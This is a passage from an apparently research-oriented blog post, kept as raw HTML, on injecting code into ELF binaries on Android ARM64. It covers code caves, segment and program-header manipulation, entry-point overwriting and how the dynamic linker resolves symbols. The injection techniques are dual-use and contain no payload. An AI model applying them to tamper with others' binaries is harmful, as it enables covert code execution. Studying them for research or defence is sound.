6e4: f944ae11 ldr x17, &lt;span style="color:#f92672">[&lt;/span>x16, &lt;span style="color:#75715e">#2392]&lt;/span>
6e8: &lt;span style="color:#ae81ff">91256210&lt;/span> add x16, x16, &lt;span style="color:#75715e">#0x958&lt;/span>
6ec: d61f0220 br x17
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that &lt;code>adrp&lt;/code> will first compute &lt;code>0x6e0 + 0x1000&lt;/code> and then zero out the least-significant 12 bits (related to page size). Thus &lt;code>x16&lt;/code> will contain &lt;code>0x1000&lt;/code>. Then &lt;code>x17&lt;/code> will contain the value located at address &lt;code>0x1000 + 0x958&lt;/code> (i.e. &lt;code>0x958 = 2392&lt;/code>), which is the second to last &lt;em>.got.plt&lt;/em> - entry, containing the address of the dynamic linker stub (see address &lt;code>0x6a0&lt;/code> in objdump - output):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --sections hello
&lt;span style="color:#f92672">[&lt;/span>Nr&lt;span style="color:#f92672">]&lt;/span> Name Type Address Off Size ES Flg Lk Inf Al
...
&lt;span style="color:#f92672">[&lt;/span>22&lt;span style="color:#f92672">]&lt;/span> .got.plt PROGBITS &lt;span style="color:#ae81ff">0000000000001930&lt;/span> &lt;span style="color:#ae81ff">000930&lt;/span> &lt;span style="color:#ae81ff">000030&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> WA &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
...
$ readelf --wide --hex-dump&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span> hello
...
0x00001950 a0060000 &lt;span style="color:#ae81ff">00000000&lt;/span> a0060000 &lt;span style="color:#ae81ff">00000000&lt;/span> ................
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Inserting data into the binary can now result in broken references. Lets consider the example that we want to append a new PHT - entry to PHT. Assuming the above platform and build, the PHT is located at&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --segments hello
Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align
...
PHDR 0x000040 0x0000000000000040 0x0000000000000040 0x000230 0x000230 R 0x8
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Appending the PHT - entry will increase the &lt;code>PHDR&lt;/code>&amp;rsquo;s size by &lt;code>0x38&lt;/code>, which again will shift everything located after the PHT by &lt;code>0x38&lt;/code> to the back. Lets consider &lt;em>.plt&lt;/em> again&lt;/p>
&lt;pre tabindex="0">&lt;code>00000000000006e0 &amp;lt;puts@plt&amp;gt;:
6e0 + 0x38: b0000010 adrp x16, 1000 --&amp;gt; x16 = 0x1000
6e4 + 0x38: f944ae11 ldr x17, [x16, #2392] --&amp;gt; x17 = 0x1000 + 0x958 = 0x1958
6e8 + 0x38: 91256210 add x16, x16, #0x958 --&amp;gt; x16 = 0x1958
6ec + 0x38: d61f0220 br x17
&lt;/code>&lt;/pre>&lt;p>So we will still jump to the same &lt;em>.plt&lt;/em> - stub we would jump to, if we did not insert the PHT - entry. In (almost) all cases, this will give you &lt;code>SIGSEG&lt;/code> or &lt;code>SIGILL&lt;/code>. This is a problem to consider whenever new data is injected into a binary. Despite the fact that we have to take care of unpatchable references, there are also patchable references that can be changed automatically (i.e. using heuristics and math) like e.g. &lt;em>.dynamic&lt;/em> entries of tag &lt;code>DT_SYMTAB&lt;/code>.&lt;/p>
&lt;p>In addition to that, if we assumed that we inserted a loadable segment, i.e. a PHT - entry of type &lt;code>PT_LOAD&lt;/code>, then the binary might crash with high probability (for me it crashed on every test). Regarding the &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=1147">kernel&lt;/a>, loadable segments are allowed to overlap, which coincides with &lt;a href="http://www.sco.com/developers/gabi/latest/ch5.pheader.html">System V gABI&lt;/a> (notice the absense of any constraints for segments in comparison to the constraints enforced for &lt;a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html">sections&lt;/a>). This may lead to the conclusion that either inserting an overlapping loadable segment introduces the same errors regarding &lt;code>adrp&lt;/code> as described above, or the dynamic linker contains code that sends a &lt;code>SIGSEG&lt;/code> or &lt;code>SIGILL&lt;/code> based on a certain condition. As all of the techniques are tested on an Android emulator with the above platform specifications, it could also be that the translator does not like overlapping loadables (&lt;code>/system/bin/ndk_translation_program_runner_binfmt_misc_arm64&lt;/code> is definitely capable of triggering &lt;code>SIGILL&lt;/code>!).&lt;/p>
&lt;h4 id="code-cave---based-injection">Code Cave - based Injection&lt;/h4>
&lt;p>The first technique described is code injection that relies on finding unused memory between two loadable segments, i.e. segments of type &lt;code>PT_LOAD&lt;/code>. For this technique to work properly, we need to consider the following things:&lt;/p>
&lt;ol>
&lt;li>This is a segment - based approach, which means that code caves must lie &lt;strong>between&lt;/strong> two loadable segments. Thus a code cave cannot be part of the process image.&lt;/li>
&lt;li>Assuming we found a code cave, in order to put it into the process image we need to either create a new or overwrite an existing PHT - entry such that it points to the code cave. Or we need to expand one of the surrounding loadable segments. The latter is hard, because loadable segments may theoretically contain other loadable segments. Therefore only &amp;ldquo;top - level&amp;rdquo; loadable segments are used to search for code caves.&lt;/li>
&lt;li>Segment - based code caves need to be searched for with respect to the file offsets and file sizes of the &amp;ldquo;top - level&amp;rdquo; loadable segments, because the code injection takes place in the file on disk, not at runtime. Again there is a problem, because the size of a segment on disk &lt;code>p_filesz&lt;/code> may be strictly less than the size in the process image &lt;code>p_memsz&lt;/code>. Appending a code cave to a loadable segment with &lt;code>p_filesz &amp;lt; p_memsz&lt;/code> may result in the injected code being overwritten by the application. Also, if combined with a PHT - based injection, one can set the virtual address and memory size to another code cave in process image.&lt;/li>
&lt;li>&lt;a href="http://www.sco.com/developers/gabi/latest/ch5.pheader.html">System V gABI&lt;/a> states that PHT - entries of loadable segments must be sorted ascendingly wrt. their virtual addresses. Therefore the combination of a code cave with overwriting/creating PHT - entries is further limited to the order of PHT - entries. In practice it seems that we can derive from the &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=1138">kernel code&lt;/a> that only the first loadable segment needs to have the smallest virtual address s.t. &lt;code>load_bias&lt;/code> is correctly set (see also the &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_main.cpp;l=544">dynamic linker code&lt;/a> responsible for calculating the &lt;code>load_bias&lt;/code> for ELF - files loaded by the kernel). There seem to be no checks regarding the order of loadable segments as regards their virtual addresses.&lt;/li>
&lt;/ol>
&lt;p>Notice that inserting a PHT - entry to point to the code cave will cause all the problems described in &lt;a href="#code-injection">Code Injection&lt;/a>.&lt;/p>
&lt;p>Injecting code into segment - based code caves is a simple and often stable way to get a binary to execute custom code. Of course seeking code caves can among other things involve analysing control flow to detect &amp;ldquo;dead&amp;rdquo; code in e.g. &lt;em>.text&lt;/em> that can be overwritten.&lt;/p>
&lt;p>The following figure illustrates overwriting an existing PHT - entry such that it points to a segment - based code cave.
&lt;img src="https://lolcads.github.io/2022/07/injection_segment_override_code_cave.png" alt="Overwrite PHT - entry plus code cave">&lt;/p>
&lt;h4 id="segment---based-injection">Segment - based Injection&lt;/h4>
&lt;p>This technique involves everything related to segments that is not already part of &lt;a href="#code-cave---based-injection">code cave - based injection&lt;/a>. To be precise, the following subtechniques can be formed:&lt;/p>
&lt;ol>
&lt;li>Overwrite an existing PHT - entry and overwrite an existing memory region. This is an abstraction of overwriting an existing PHT - entry such that it points to a segment - based code cave. Of course the PHT - entry should point to the overwritten memory, which can be a segment that is not part of the process image or something else.&lt;/li>
&lt;li>Overwrite an existing PHT - entry and insert new memory to be interpreted as a segment. Inserting new memory will result in problems related to cross - references described in &lt;a href="#code-injection">Code Injection&lt;/a>. Also this will result in a &amp;ldquo;dead&amp;rdquo; memory region, because the memory region the overwritten PHT - entry was referencing is not interpreted as a segment anymore.&lt;/li>
&lt;li>Insert a new PHT - entry and overwrite an existing memory region. This is again an abstraction of a code cave - based injection technique, but now arbitrary memory can be interpreted as a segment (notice that the memory region we overwrite is not limited to memory regions between loadable segments as in &lt;a href="#code-cave---based-injection">Code - Cave - based Injection&lt;/a>). Although it can happen that two PHT - entries reference the same memory region. Again note that inserting a new PHT - entry may invalidate cross - references.&lt;/li>
&lt;li>Finally one can insert a new PHT - entry and a new memory region. As long as one can manage validating cross - references, this technique is the least intrusive one and is even reversible.&lt;/li>
&lt;/ol>
&lt;p>The following figure depicts inserting a completely new segment:
&lt;img src="https://lolcads.github.io/2022/07/injection_segment_inject_inject_memory.png" alt="Insert PHT - entry plus new memory">&lt;/p>
&lt;p>Thinking back to &lt;a href="#rule-of-two">using two parsers&lt;/a>, we can see that the &amp;ldquo;mixed&amp;rdquo; techniques are problematic. To be precise, after calling &lt;code>rawelf_injection&lt;/code>, LIEF will cause a segmentation fault during its parsing phase. It might be related to the fact that both &amp;ldquo;mixed&amp;rdquo; techniques result in some form of &amp;ldquo;dead&amp;rdquo; memory, i.e. either a &amp;ldquo;dead&amp;rdquo; PHT - entry or a &amp;ldquo;dead&amp;rdquo; memory region. A solution is to avoid reparsing, i.e. call &lt;code>rawelf_injection&lt;/code> independently from LIEF.&lt;/p>
&lt;h3 id="code-execution">Code Execution&lt;/h3>
&lt;p>Making already injected code executable is key to seeing any signs of life of our code. Technically speaking, there is a plethora of ways to make code executable, but most of them are highly platform - dependent. Thus we try to focus on the most abstract methods to archive code execution.&lt;/p>
&lt;p>LIEF fully supports all following approaches, which prevents compatibility issues between the two parsers.&lt;/p>
&lt;h4 id="entry-point">Entry Point&lt;/h4>
&lt;p>The most natural approach is to overwrite the entry point address &lt;code>e_entry&lt;/code> located in the ELF - header. However, it might be unclear what to write into &lt;code>e_entry&lt;/code> at the first glance. &lt;code>e_entry&lt;/code> is a &lt;strong>virtual address&lt;/strong> pointing to the first instruction executed after the OS/dynamic linker is done setting up the execution environment. As all code injection techniques discussed above work with &lt;strong>file offsets&lt;/strong>, there needs to be a translation from file offet to virtual address. Fortunately, LIEF provides us with a function that does exactly that&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">vaddr &lt;span style="color:#f92672">=&lt;/span> binary&lt;span style="color:#f92672">.&lt;/span>offset_to_virtual_address(off)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Theoretically the conversion can be done manually aswell. For that assume that the injected code is part of a loadable segment (of type &lt;code>Elf64_Phdr&lt;/code>). Then&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">vaddr &lt;span style="color:#f92672">=&lt;/span> (off &lt;span style="color:#f92672">-&lt;/span> seg&lt;span style="color:#f92672">.&lt;/span>p_offset) &lt;span style="color:#f92672">+&lt;/span> seg&lt;span style="color:#f92672">.&lt;/span>p_vaddr
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Intuition behind that is that the relative offset of a structure to the beginning of the segment that contains the structure will remain the same, regardless of whether we are in the process image or in the file. Note that this conversion might &lt;strong>not work in general&lt;/strong>.&lt;/p>
&lt;p>The following picture shows the general idea of this technique:
&lt;img src="https://lolcads.github.io/2022/07/execution_override_entry.png" alt="Overwrite entry point">&lt;/p>
&lt;h4 id="dynsym---based-injection">&lt;em>.dynsym&lt;/em> - based Injection&lt;/h4>
&lt;p>Another idea to make code executable would be to define a symbol such that it points to the injected code. This technique is &lt;strong>dependent on the &lt;em>Dynamic Linker&lt;/em>&lt;/strong>, because the dynamic linker determines how a symbol is resolved at runtime. We would need the following assumptions:&lt;/p>
&lt;ol>
&lt;li>Dynamic Linker will not resolve a symbol, if there is already a non - zero definition in &lt;em>.dynsym&lt;/em>, and will use that existing definition.&lt;/li>
&lt;li>Target binary uses &lt;em>Dynamic Linking&lt;/em>.&lt;/li>
&lt;li>&lt;em>.dynamic&lt;/em> neither contains an entry with tag &lt;code>DT_BIND_NOW&lt;/code> nor any other platform - dependent entry that enforces non - lazy binding. Also there must not be an entry with tag &lt;code>DT_FLAGS&lt;/code> and value &lt;code>DF_BIND_NOW&lt;/code>. This is rather nice to have than necessary, because lazy binding allows for injected code to be executed before a symbol is resolved, thus leaving a time window, in which symbol resolution can be manipulated.&lt;/li>
&lt;/ol>
&lt;p>This time we are out of luck though. At least one of the above assumptions does not hold on our target platform and thus this technique is not applicable! If we were to manipulate relocations, we might be able to get a similar technique to work. Although it would not require &lt;em>.dynsym&lt;/em>.&lt;/p>
&lt;h5 id="the-tradegy-of-lazy-binding">The Tradegy of Lazy Binding&lt;/h5>
&lt;p>For this section we assume that we are looking at an Android OS (e.g. 12) on an ARM64 (i.e. AARCH64) architecture. For these platform specifications I want to explain that the dynamic linker &lt;strong>always&lt;/strong> uses &lt;code>BIND_NOW&lt;/code>, i.e. non - lazy binding!&lt;/p>
&lt;p>Lets remember that, if we execute a binary (e.g. using &lt;code>execve&lt;/code>), the kernel will load the binary into memory. According to &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=2082">AOSP&lt;/a>, we can derive the following call stack:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Order&lt;/th>
&lt;th>Function Call&lt;/th>
&lt;th>Line&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1.&lt;/td>
&lt;td>&lt;code>syscall(execve, argv, envp)&lt;/code>&lt;/td>
&lt;td>-&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2.&lt;/td>
&lt;td>&lt;code>do_execve(getname(filename), argv, envp)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=2087">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3.&lt;/td>
&lt;td>&lt;code>do_execveat_common(AT_FDCWD, filename, argv, envp, 0)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=2011">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4.&lt;/td>
&lt;td>&lt;code>bprm_execve(bprm, fd, filename, flags)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=1941">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5.&lt;/td>
&lt;td>&lt;code>exec_binprm(bprm)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=1836">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6.&lt;/td>
&lt;td>&lt;code>search_binary_handler(bprm)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=1767">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>7.&lt;/td>
&lt;td>&lt;code>fmt-&amp;gt;load_binary(bprm)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=1726">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>In the file &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=100">&lt;code>common/fs/binfmt_elf.c&lt;/code>&lt;/a> we can find the corresponding binary format that is registering &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=824">&lt;code>load_elf_binary&lt;/code>&lt;/a> as the function that is called last in the call stack. Investigating that function leads us to the conclusion that the kernel may handle loading the binary. Also we can see that if the program to be executed uses an interpreter, i.e. there is a segment of type &lt;code>PT_INTERP&lt;/code>, then the kernel will &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=1260">set the entry point to the entry point of the interpreter&lt;/a> and &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=1348">start a thread at this entry point&lt;/a>.&lt;/p>
&lt;p>This brings us to the dynamic linker, whose &amp;ldquo;nice&amp;rdquo; entry point is &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_main.cpp;l=311">&lt;code>linker_main&lt;/code>&lt;/a>. Of course we assume that we are looking at a binary that has at least one &lt;code>DT_NEEDED&lt;/code> - entry in &lt;em>.dynamic&lt;/em>. This will trigger a call to the function &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_main.cpp;l=483">&lt;code>find_libraries&lt;/code>&lt;/a>. This function tries to load all dynamic dependencies in a very complex way. Eventually it will call &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker.cpp;l=1760;drc=beeaf36389bde1c5db8a676df575348f47e68594">&lt;code>soinfo::link_image&lt;/code>&lt;/a> with a lookup list containing descriptions of shared libraries to consider while linking:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>si&lt;span style="color:#f92672">-&amp;gt;&lt;/span>link_image(lookup_list, local_group_root, link_extinfo, &lt;span style="color:#f92672">&amp;amp;&lt;/span>relro_fd_offset) &lt;span style="color:#f92672">||&lt;/span>
&lt;span style="color:#f92672">!&lt;/span>get_cfi_shadow()&lt;span style="color:#f92672">-&amp;gt;&lt;/span>AfterLoad(si, solist_get_head())) {
&lt;span style="color:#66d9ef">return&lt;/span> false;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Within &lt;code>soinfo::link_image&lt;/code>, there is a sneaky call to &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker.cpp;l=3277">&lt;code>relocate&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>relocate(lookup_list)) {
&lt;span style="color:#66d9ef">return&lt;/span> false;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We know that the first &lt;em>.plt&lt;/em> - entry will lookup symbols, if the corresponding functions are called for the first time, in case of lazy binding. This means that we now expect corresponding relocations to take place s.t. &lt;em>.got.plt&lt;/em> (according to &lt;a href="https://maskray.me/blog/2021-08-29-all-about-global-offset-table">this&lt;/a>, &lt;em>.got.plt&lt;/em> holds symbol addresses used by &lt;em>.plt&lt;/em> - entries) eventually contains all function addresses before the program gets in control. Thus we will look for &lt;code>R_AARCH64_JUMP_SLOT&lt;/code> relocation types. Assuming the dynamic linker is compiled with &lt;code>USE_RELA&lt;/code>, it will &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=640">run&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>plain_relocate&lt;span style="color:#f92672">&amp;lt;&lt;/span>RelocMode&lt;span style="color:#f92672">::&lt;/span>JumpTable&lt;span style="color:#f92672">&amp;gt;&lt;/span>(relocator, plt_rela_, plt_rela_count_)) {
&lt;span style="color:#66d9ef">return&lt;/span> false;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Following the one-liners we will wind up in &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=160">&lt;code>process_relocation_impl&lt;/code>&lt;/a>. As we are assuming that our relocation type of interest is &lt;code>R_AARCH64_JUMP_SLOT&lt;/code>, we get that its &lt;code>r_sym&lt;/code> refers to the corresponding &lt;em>.dynsym&lt;/em> - entry and is thus &lt;strong>not&lt;/strong> 0. This will result in an &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=280">&lt;code>r_sym == 0&lt;/code> - check&lt;/a> to be false, which triggers a symbol lookup in the corresponding &lt;code>else&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>if (!lookup_symbol&amp;lt;IsGeneral&amp;gt;(relocator, r_sym, sym_name, &amp;amp;found_in, &amp;amp;sym)) return false;
&lt;/code>&lt;/pre>&lt;p>(btw. the &lt;code>relocator&lt;/code> contains &lt;code>lookup_list&lt;/code>).&lt;/p>
&lt;p>Again following the control flow will reveal a call to &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=108">&lt;code>soinfo_do_lookup&lt;/code>&lt;/a>:&lt;/p>
&lt;pre tabindex="0">&lt;code>... soinfo_do_lookup(sym_name, vi, &amp;amp;local_found_in, relocator.lookup_list);
&lt;/code>&lt;/pre>&lt;p>which, after following one - liners again, brings us to a function called &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=119">&lt;code>soinfo_do_lookup_impl&lt;/code>&lt;/a>. This function will resolve a given symbol by name utilising the hash sections and symbol versioning. Eventually, it returns an instance of &lt;code>Elf64_Sym&lt;/code> that is forwarded all the way back to &lt;code>process_relocation_impl&lt;/code>. It will be used to compute the correct address of the symbol via&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">ElfW(Addr) resolve_symbol_address(&lt;span style="color:#66d9ef">const&lt;/span> ElfW(Sym)&lt;span style="color:#f92672">*&lt;/span> s) &lt;span style="color:#66d9ef">const&lt;/span> {
&lt;span style="color:#66d9ef">if&lt;/span> (ELF_ST_TYPE(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info) &lt;span style="color:#f92672">==&lt;/span> STT_GNU_IFUNC) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">call_ifunc_resolver&lt;/span>(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_value &lt;span style="color:#f92672">+&lt;/span> load_bias);
}
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>ElfW(Addr)&lt;span style="color:#f92672">&amp;gt;&lt;/span>(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_value &lt;span style="color:#f92672">+&lt;/span> load_bias);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As most symbols are of type &lt;code>STT_FUNC&lt;/code>, we just consider the second return statement.&lt;/p>
&lt;p>Finally, the result of &lt;code>resolve_symbol_address(sym)&lt;/code> is stored in &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=289">&lt;code>sym_addr&lt;/code>&lt;/a> and used in&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">constexpr&lt;/span> (IsGeneral &lt;span style="color:#f92672">||&lt;/span> Mode &lt;span style="color:#f92672">==&lt;/span> RelocMode&lt;span style="color:#f92672">::&lt;/span>JumpTable) {
&lt;span style="color:#66d9ef">if&lt;/span> (r_type &lt;span style="color:#f92672">==&lt;/span> R_GENERIC_JUMP_SLOT) {
count_relocation_if&lt;span style="color:#f92672">&amp;lt;&lt;/span>IsGeneral&lt;span style="color:#f92672">&amp;gt;&lt;/span>(kRelocAbsolute);
&lt;span style="color:#66d9ef">const&lt;/span> ElfW(Addr) result &lt;span style="color:#f92672">=&lt;/span> sym_addr &lt;span style="color:#f92672">+&lt;/span> get_addend_norel();
trace_reloc(&lt;span style="color:#e6db74">&amp;#34;RELO JMP_SLOT %16p &amp;lt;- %16p %s&amp;#34;&lt;/span>,
rel_target, &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&amp;gt;&lt;/span>(result), sym_name);
&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>ElfW(Addr)&lt;span style="color:#f92672">*&amp;gt;&lt;/span>(rel_target) &lt;span style="color:#f92672">=&lt;/span> result;
&lt;span style="color:#66d9ef">return&lt;/span> true;
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will write the address of the symbol into the corresponding &lt;em>.got.plt&lt;/em> - entry.&lt;/p>
&lt;p>All in all this happens at startup of a program. We started at &lt;code>execve&lt;/code> and only considered dynamic linker code that is executed before the program gets in charge (i.e. before the dynamic linker returns from &lt;code>linker_main&lt;/code>). Therefore the dynamic linker always uses &lt;code>BIND_NOW&lt;/code>.&lt;/p>
&lt;h5 id="symbol-hashing-and-lief">Symbol Hashing and LIEF&lt;/h5>
&lt;p>In order to quickly determine, whether a symbol is defined in an ELF - file, two sections can be utilised:&lt;/p>
&lt;ol>
&lt;li>&lt;em>.gnu.hash&lt;/em>&lt;/li>
&lt;li>&lt;em>.hash&lt;/em>&lt;/li>
&lt;/ol>
&lt;p>We will only focus on &lt;em>.gnu.hash&lt;/em>, because it suffices for showcasing the problem.&lt;/p>
&lt;p>From the previous section we know that the dynamic linker performs a symbol lookup via &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=119">&lt;code>soinfo_do_lookup_impl&lt;/code>&lt;/a>. To be precise, it will iterate over all libraries defined in &lt;code>lookup_list&lt;/code> and use the Bloom filter in &lt;em>.gnu.hash&lt;/em> to check whether a symbol is defined in an ELF - file or not. If the Bloom filter &amp;ldquo;says no&amp;rdquo;, the symbol is &lt;strong>not&lt;/strong> defined in that ELF - file with probability assumed to be 100%. If the Bloom filter &amp;ldquo;says probably yes&amp;rdquo;, then further checks are needed to identify whether the symbol is really defined in that ELF - file (for those interested, see &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=151">this&lt;/a>).&lt;/p>
&lt;p>This implies that there needs to be an entry in &lt;em>.gnu.hash&lt;/em> in order for the dynamic linker to take a corresponding symbol definition into account. Unfortunately, LIEF does &lt;strong>not&lt;/strong> create a new entry in &lt;em>.gnu.hash&lt;/em> upon adding a new symbol to &lt;em>.dynsym&lt;/em>. Neither does &lt;code>rawelf_injection&lt;/code>, as it was designed according to &lt;em>System V gABI&lt;/em>, which does not even mention &lt;em>.gnu.hash&lt;/em>. Therefore overwriting an existing symbol in &lt;em>.dynsym&lt;/em> using &lt;code>rawelf_injection&lt;/code> will also not create/overwrite a &lt;em>.gnu.hash&lt;/em> - entry. This leaves us with overwriting symbols, whose symbol names are already defined in &lt;em>.gnu.hash&lt;/em> of the ELF - file we are manipulating. Thus we cannot overwrite symbols that are defined in other shared object files unless we manipulate the respective libraries. Lets assume we have a symbol to overwrite, then there is a limitation to what the corresponding &lt;em>.dynsym&lt;/em> - entry must look like. Notice that in &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=187">&lt;code>soinfo_do_lookup_impl&lt;/code>&lt;/a> there is a call to &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.h;l=60">&lt;code>is_symbol_global_and_defined&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">inline&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> &lt;span style="color:#a6e22e">is_symbol_global_and_defined&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> soinfo&lt;span style="color:#f92672">*&lt;/span> si, &lt;span style="color:#66d9ef">const&lt;/span> ElfW(Sym)&lt;span style="color:#f92672">*&lt;/span> s) {
&lt;span style="color:#66d9ef">if&lt;/span> (__predict_true(ELF_ST_BIND(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info) &lt;span style="color:#f92672">==&lt;/span> STB_GLOBAL &lt;span style="color:#f92672">||&lt;/span>
ELF_ST_BIND(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info) &lt;span style="color:#f92672">==&lt;/span> STB_WEAK)) {
&lt;span style="color:#66d9ef">return&lt;/span> s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_shndx &lt;span style="color:#f92672">!=&lt;/span> SHN_UNDEF;
